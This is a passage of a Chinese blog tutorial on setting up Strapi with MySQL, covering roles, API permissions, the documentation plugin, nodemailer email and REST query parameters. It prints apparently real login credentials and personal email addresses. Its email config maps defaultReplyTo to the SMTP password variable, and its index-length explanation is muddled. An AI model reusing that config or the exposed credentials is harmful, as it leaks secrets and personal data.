#D4D4D4"> </span><span style="color: #CE9178">account</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">on</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Strapi</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Cloud</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">and</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">benefit</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">from:</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">-</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">✦</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Blazing-fast</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">✦</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">deployment</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">for</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">your</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">projects</span></span><span class="line"><span style="color: #DCDCAA">-</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">✦</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Exclusive</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">✦</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">access</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">to</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">resources</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">to</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">make</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">your</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">project</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">successful</span></span><span class="line"><span style="color: #DCDCAA">-</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">An</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">✦</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Awesome</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">✦</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">community</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">and</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">full</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">enjoyment</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">of</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Strapi's ecosystem</span></span><span class="line"></span><span class="line"><span style="color: #CE9178">Start your 14-day free trial now!</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #CE9178">? Please log in or sign up. Skip</span></span><span class="line"><span style="color: #CE9178">? Do you want to use the default database (sqlite) ? (Y/n) n</span></span><span class="line"><span style="color: #CE9178">? Choose your default database client mysql</span></span><span class="line"><span style="color: #CE9178">? Database name: demo1</span></span><span class="line"><span style="color: #CE9178">? Host: localhost</span></span><span class="line"><span style="color: #CE9178">? Port: 3306</span></span><span class="line"><span style="color: #CE9178">? Username: root</span></span><span class="line"><span style="color: #CE9178">? Password: ****</span></span><span class="line"><span style="color: #CE9178">? Enable SSL connection: (y/N) N</span></span><span class="line"><span style="color: #CE9178">? Start with an example structure &amp; data? (y/N) N</span></span><span class="line"><span style="color: #CE9178">? Start with Typescript? (Y/n) n</span></span><span class="line"><span style="color: #CE9178">? Install dependencies with npm? (Y/n) Y</span></span><span class="line"><span style="color: #CE9178">? Initialize a git repository? (Y/n) n</span></span></code></pre></div></div></figure><ul><li><code>? Please log in or sign up. Skip</code>：意思是让你进行在线登录，我选择跳过</li><li><code>? Do you want to use the default database (sqlite) ? (Y/n) n</code>：是否使用默认的 sqlite 数据库，我选择否</li><li><code>? Choose your default database client mysql</code>：出现三个选项让你选择，我选择 mysql</li><li><code>? Database name: demo1</code>：输入要连接的数据库名字（准备好一个空表的数据库）</li><li><code>? Host: localhost</code>：数据库的 host 地址，本地就是 localhost，远程填公网 ip</li><li><code>? Port: 3306</code>：数据库端口，我选择默认端口 3306</li><li><code>? Enable SSL connection: (y/N) N</code>：是否启用 SSL 连接？可自行决定（<a href="https://wiki.sqlfans.cn/mysql/mysql-bp-ssl-enable.html">什么是数据库 SSL 连接？</a>）</li><li><code>? Start with an example structure &amp; data? (y/N) N</code>：是否需要安装时附带简单数据？我自行决定数据，所以选否</li><li><code>? Start with Typescript? (Y/n) n</code>：项目需要 TypeScript 吗？可自行决定</li><li><code>? Install dependencies with npm? (Y/n) Y</code>：是否使用 npm 安装依赖？我选择是，省去手动安装依赖的命令</li><li><code>? Initialize a git repository? (Y/n) n</code>：是否初始化一个 git 仓库？可自行决定</li></ul><p>经过些许等待，看到以下画面说明成功了：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111812868.png" alt="image-20241011181201688"></p><p>如果你在安装时选择了不自动安装依赖，进入项目内是没有 node-modules 包的，可手动安装</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span></span></code></pre></div></div></figure><p>安装好依赖之后请先别着急启动，接着看汉化步骤（如果你英语好，也请看看汉化小节的最后，运行命令在那里）</p><h2 id="strapi-汉化"><a class="markdownIt-Anchor" href="#strapi-汉化"></a> Strapi 汉化</h2><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409210045773.png" alt="image-20240921004508650"></p><p>项目运行登录进面板之后点击左下角的 profile 进行设置</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409210109467.png" alt="image-20240921010929358"></p><h2 id="运行-strapi-应用"><a class="markdownIt-Anchor" href="#运行-strapi-应用"></a> 运行 Strapi 应用</h2><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">run</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">develop</span></span></code></pre></div></div></figure><p>或</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">develop</span></span></code></pre></div></div></figure><h2 id="strapi-运行-mysql-建表报错"><a class="markdownIt-Anchor" href="#strapi-运行-mysql-建表报错"></a> Strapi 运行 - MySQL 建表报错</h2><blockquote><p>Error: alter table <code>i18n_locale</code> add index <code>i18n_locale_documents_idx</code>(<code>document_id</code>, <code>locale</code>, <code>published_at</code>)<br>Specified key was too long; max key length is 1000 bytes</p></blockquote><p>类似上述报错，这是因为 MySQL 对于 <a href="https://so.csdn.net/so/search?q=InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E&amp;spm=1001.2101.3001.7020">InnoDB 存储引擎</a>有一个索引键长度的限制，这个限制基于字符集的不同而不同。在使用 <code>utf8</code> 字符集时，每个字符可能占用 <code>3</code> 个字节，那么对于 <code>innodb</code> 表，索引键的最大长度大约为 <code>1000</code> 个字符左右（因为 <code>3072 / 3 ≈ 1024</code>）。若字符集是 <code>utf8mb4</code>，每个字符可能占用 <code>4</code> 个字节，所以最大长度会进一步减少到 <code>768</code> 个字符左右（<code>3072 / 4 = 768</code>）</p><blockquote><p>uf8mb4 字符集:<br>要在 Mysql 中保存 4 字节长度的 UTF-8 字符，需要使用 utf8mb4 字符集（mb4 就是 most bytes 4 的意思，专门用来兼容四字节的 unicode），但只有 5.5.3 版本以后的才支持。<br>为了获取更好的兼容性，应该总是使用 utf8mb4 而非 utf8. 对于 CHAR 类型数据，utf8mb4 会多消耗一些空间，根据 Mysql 官方建议，使用 VARCHAR 替代 CHAR。其实，utf8mb4 是 utf8 的超集，理论上原来使用 utf8，然后将字符集修改为 utf8mb4，也会不会对已有的 utf8 编码读取产生任何问题。当然，为了节省空间一般情况下使用 utf8 也就够了。</p></blockquote><h3 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h3><p>由于我使用的是 PHPstudy 集成的 MySQL8 所以直接找到 PHPstudy 将引擎改为 InnoDB 就好了</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409210102415.png" alt="image-20240921010242363"></p><h2 id="strapi-启动项目登录凭证"><a class="markdownIt-Anchor" href="#strapi-启动项目登录凭证"></a> Strapi 启动项目登录凭证</h2><p>正确启动之后，会自动打开浏览器访问 admin 管理面板的注册页面，请自行注册。</p><p>注册产生的凭证决定你是否能登录上 Strapi 的管理面板，请妥善保存你的登录信息。</p><p>可只保存关键信息，下面是我的示例：</p><table><thead><tr><th>配置项</th><th>值</th></tr></thead><tbody><tr><td> name</td><td>4rozen</td></tr><tr><td> 姓氏</td><td> Chen</td></tr><tr><td> 电子邮件</td><td><code>maril4chen@foxmail.com</code></td></tr><tr><td>密码</td><td> Strapi1005</td></tr></tbody></table><h2 id="了解-strapi-的身份管理机制"><a class="markdownIt-Anchor" href="#了解-strapi-的身份管理机制"></a> 了解 Strapi 的身份管理机制</h2><p>Strapi 可以设置普通注册用户为 Authenticaed 或 public 分组</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231751921.png" alt="image-20240923175122837" style="zoom:67%;"><p>由于进行普通注册会默认得到 jwt 令牌，所以我们可以设置为 Authenticaed 分组</p><p>这里你一定会疑惑 Strapi 的身份机制到底是什么？</p><p>对普通用户简单来说有以下身份：</p><ol><li>public：未经过身份验证的用户所在分组，访问接口只能访问公共接口</li><li> Authenticaed：经过身份验证的用户所在分组，访问接口更多</li></ol><blockquote><p>身份验证发生在登录或者是注册，能完成其中之一都可以算作身份验证通过</p></blockquote><p>每一个用户登录之前都是 public 用户，在注册后就成为了 Authenticaed user 经过验证的用户。</p><p>Strapi 使用 Roles 来对普通注册的 user 用户进行分组，在 content manager 中有默认创建的 Users 表，可以点击用户进行设置，分为以下身份：</p><ul><li><p>Authenticaed：身份验证通过的用户</p></li><li><p>public：路人</p></li></ul><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231812271.png" alt="image-20240923181205208"></p><p>Strapi 同样也对通过后台 admin 进行注册的管理员用户使用 Roles 来进行管理，分为：</p><ul><li>Author：作者可以管理他们创建的内容。</li><li>Editor：编辑者可以管理和发布内容，包括其他用户的内容。</li><li>Super Admin：超级用户可以访问和管理所有功能和设置。</li></ul><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231817758.png" alt="image-20240923181701691"></p><p><strong>第一次注册进来默认是 Super Admin 超级管理员。</strong></p><p>如果有更多人，点击 Administration panel 管理面板中的 Roles 角色可以进行分组管理。</p><h2 id="如何创建表结构"><a class="markdownIt-Anchor" href="#如何创建表结构"></a> 如何创建表结构</h2><p>可能看到上面的身份管理你一脸懵，没关系，我们先来创建一个用于存放商品信息的示例表：</p><ol><li><p>点击左侧侧边栏的 Content-Type Builder 内容构建<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111826492.png" alt="image-20241011182621412"></p></li><li><p>点击 Create new collection type 创建内容集合类型的复杂数据表，这种表结构支持表与表之间的引用关联，这有助于我们创建符合数据要求的数据结构<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111828046.png" alt="image-20241011182837966"></p></li><li><p>填写单数形式的表名，当然复数形式的表名也可以<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111832024.png" alt="image-20241011183217936" style="zoom:67%;"></p></li><li><p>点击 ADVANCED SETTINGS 高级设置<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111834339.png" alt="image-20241011183455258" style="zoom:67%;"></p></li><li><p>点击 Continue 继续，此时需要你进行表的字段设置，比如设置商品名和商品图如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111837231.png" alt="image-20241011183733123" style="zoom:67%;"></p><p>具体设置 Text 类型的商品名如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111841019.png" alt="image-20241011184132933" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111843156.png" alt="image-20241011184331055" style="zoom:67%;"></p><p>设置商品图片如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111845558.png" alt="image-20241011184512477" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111846054.png" alt="image-20241011184637966" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111847286.png" alt="image-20241011184717164" style="zoom:67%;"></p><p>添加成功之后别忘记点击 Save 保存</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111848805.png" alt="image-20241011184806683"></p><p>之后 Strapi 将进行重启，不出意外将成功创建 Good 数据表和我们刚才添加的字段：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111853588.png" alt="image-20241011185353508"></p></li><li><p>填充数据：点击左侧边栏的 Content Manager 内容管理选择刚才我们创建的数据表 good 并点击右上角的 Create new entry 创建实体就行了。</p></li></ol><h2 id="strapi-接口权限设置"><a class="markdownIt-Anchor" href="#strapi-接口权限设置"></a> Strapi 接口权限设置</h2><p>数据表有了，怎么通过接口调试呢？</p><p>Strapi 的接口要想调试，首先得给予权限。</p><ol><li><p>找到左侧侧边栏的 setting 然后点击 Roles<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111953074.png" alt="image-20241011195314924"></p><p><code>Authenticated</code> 为经过注册等身份验证手段的用户，而 Public 为公共用户。这将以此分割接口权限，<code>Public</code> 为随便就能访问的接口，<code>Authenticated</code> 为身份验证之后才能使用的接口</p></li><li><p>除了登录注册接口，我们可能会希望所有接口能够经过权限验证才能通行。但是我这里为了演示，就将 <code>good</code> 表的接口给 <code>Public</code> 用户开通：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111958468.png" alt="image-20241011195836369" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410112000118.png" alt="image-20241011200008789"></p></li><li><p>别忘记右上角点击保存。我这里直接使用浏览器进行接口测试：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410112008460.png" alt="image-20241011200804395" style="zoom:67%;"></li></ol><p>如果想接口限权，只允许身份验证的用户才能使用的话，就请给 <code>Authenticated</code> 用户开权限而不是 Public</p><h2 id="strapi-接口文档查看"><a class="markdownIt-Anchor" href="#strapi-接口文档查看"></a> Strapi 接口文档查看</h2><blockquote><p>说到接口，这里推荐安装 document 插件进行可视化查看，因为 Strapi 默认不提供可视化的接口文档，只提供接口路由可供查看。</p><p>插件官方文档：<a href="https://docs.strapi.io/dev-docs/plugins/documentation">https://docs.strapi.io/dev-docs/plugins/documentation</a></p></blockquote><p>安装接口文档插件命令</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">add</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">@strapi/plugin-documentation</span></span><span class="line"><span style="color: #6A9955"># 或者npm</span></span><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">@strapi/plugin-documentation</span></span></code></pre></div></div></figure><p>接口文档访问地址</p><figure class="shiki http"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">http://localhost:1337/documentation/v1.0.0#/</span></span></code></pre></div></div></figure><p>其中 Users-Permissions - Auth 为认证用户和普通用户的接口，下面的 User-Permissions 则是管理员端的相关接口。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231908943.png" alt="image-20240923190855795"></p><h2 id="配置邮箱发信插件"><a class="markdownIt-Anchor" href="#配置邮箱发信插件"></a> 配置邮箱发信插件</h2><p>Strapi 默认并不会自行配置邮件服务。</p><p>为了能够发送邮件（例如密码重置邮件），需要设置一个邮件提供商（如 SendGrid、Gmail、SMTP 等）。如果没有配置邮件提供商，本地 Strapi 无法实际发送邮件。</p><h3 id="安装-nodemailer-插件"><a class="markdownIt-Anchor" href="#安装-nodemailer-插件"></a> 安装 <code>nodemailer</code> 插件</h3><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># using yarn</span></span><span class="line"><span style="color: #DCDCAA">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">add</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">@strapi/provider-email-nodemailer</span></span><span class="line"></span><span class="line"><span style="color: #6A9955"># using npm</span></span><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">@strapi/provider-email-nodemailer</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--save</span></span></code></pre></div></div></figure><h3 id="配置-email-provider"><a class="markdownIt-Anchor" href="#配置-email-provider"></a> <strong>配置 Email Provider</strong></h3><p>接下来，需要配置邮件提供商。</p><p>在 Strapi 中，邮件服务的配置文件位于 <code>config/plugins.js</code>。国内推荐 qq 或者网易邮箱（自行搜索邮箱开通 SMTP），这里介绍网易邮箱配置：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #4EC9B0">module</span><span style="color: #D4D4D4">.</span><span style="color: #4EC9B0">exports</span><span style="color: #D4D4D4"> = ({ </span><span style="color: #9CDCFE">env</span><span style="color: #D4D4D4"> }) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> ({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// ...</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">email:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">config:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">provider:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"nodemailer"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">providerOptions:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">host:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">env</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SMTP_HOST"</span><span style="color: #D4D4D4">), </span><span style="color: #6A9955">// 网易邮箱SMTP服务器地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">port:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">env</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SMTP_PORT"</span><span style="color: #D4D4D4">), </span><span style="color: #6A9955">// SSL端口</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">secure:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 使用SSL</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">auth:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">user:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">env</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SMTP_USERNAME"</span><span style="color: #D4D4D4">), </span><span style="color: #6A9955">// 网易邮箱账号</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">pass:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">env</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SMTP_PASSWORD"</span><span style="color: #D4D4D4">), </span><span style="color: #6A9955">// 授权码</span></span><span class="line"><span style="color: #D4D4D4">        },</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 其他自定义Nodemailer选项</span></span><span class="line"><span style="color: #D4D4D4">      },</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">settings:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">defaultFrom:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">env</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SMTP_USERNAME"</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">defaultReplyTo:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">env</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SMTP_PASSWORD"</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">      },</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// ...</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><h3 id="获取-smtp-授权码"><a class="markdownIt-Anchor" href="#获取-smtp-授权码"></a> 获取 SMTP 授权码</h3><ol><li>登录 163 邮箱。</li><li>打开 <strong>设置</strong> -&gt; <strong>POP3/SMTP/IMAP</strong>。</li><li>开启 <strong>SMTP</strong> 服务，并生成授权码（<strong>授权码只展示一次，请妥善保存</strong>）。</li></ol><p>在你的 <code>.env</code> 文件中设置相应的环境变量</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># Mail</span></span><span class="line"><span style="color: #9CDCFE">SMTP_HOST</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">smtp.163.com</span></span><span class="line"><span style="color: #9CDCFE">SMTP_PORT</span><span style="color: #D4D4D4">=</span><span style="color: #B5CEA8">465</span></span><span class="line"><span style="color: #9CDCFE">SMTP_USERNAME</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">your_mail0@163.com</span></span><span class="line"><span style="color: #9CDCFE">SMTP_PASSWORD</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">JBxxxxxxxxxxxxtreB</span></span></code></pre></div></div></figure><h3 id="修改-template-模板"><a class="markdownIt-Anchor" href="#修改-template-模板"></a> 修改 template 模板</h3><p><strong>将模板中的发件人和刚才配置的插件文件中的发件人一致</strong></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409232306287.png" alt="image-20240923230633136"></p><p>否则你可能遇到错误</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">Error:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Mail</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">command</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">failed:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">501</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Mail</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">address</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">must</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">be</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">same</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">as</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">authorization</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">user.</span></span></code></pre></div></div></figure><h2 id="api-查询媒体数据"><a class="markdownIt-Anchor" href="#api-查询媒体数据"></a> API - 查询媒体数据</h2><p>在查询某些包含关系、媒体字段（图片、视频等）、组件或动态区域的接口时，如果不在查询参数中加上 <code>populate</code> 参数，Strapi 将默认不会查询返回，这是出于性能考虑。</p><p>例如 <code>/api/users/me</code> 接口，假设 Users 表中还包含一个 avatar 头像字段，则想要接口返回头像数据，应该是如下查询（<code>*</code> 表示查询所有关系）</p><figure class="shiki http"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">http://localhost:1337/api/users/me?populate=*</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409242108207.png" alt="image-20240924210837091"></p><blockquote><p>populate 参数中文文档参考：<a href="https://strapi.nodejs.cn/dev-docs/api/rest/populate-select/">https://strapi.nodejs.cn/dev-docs/api/rest/populate-select/</a></p></blockquote><h2 id="api-查询特定字段"><a class="markdownIt-Anchor" href="#api-查询特定字段"></a> API - 查询特定字段</h2><p>查询请求可以接受 <code>fields</code> 参数来<strong>仅选择</strong>某些字段。默认情况下，仅返回以下 <a href="https://strapi.nodejs.cn/dev-docs/backend-customization/models#model-attributes">字段类型</a>：</p><ul><li>字符串类型：字符串、文本、富文本、枚举、电子邮件、密码和 uid，</li><li>日期类型：日期、时间、日期时间和时间戳，</li><li>号码类型：整数、大整数、浮点数和小数，</li><li>通用类型：布尔值、数组和 JSON。</li></ul><blockquote><p>字段选择不适用于关系、媒体、组件或动态区域字段。要填充这些字段，请使用 <a href="https://strapi.nodejs.cn/dev-docs/api/rest/populate-select/#population"><code>populate</code> 参数</a>。</p></blockquote><p>该参数可以限制响应的数据字段，可以使得某些数据不被暴露，一定程度提高安全性和数据简洁性。</p><p>例如 <code>/api/users/me</code> 接口，查询所有的关系返回数据为</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">11</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"dtree1c2woi3njmz56xmttcm"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"username"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"xiaowu1"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"email"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"1681237971@qq.com"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"provider"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"local"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"confirmed"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"blocked"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">false</span><span style="color: 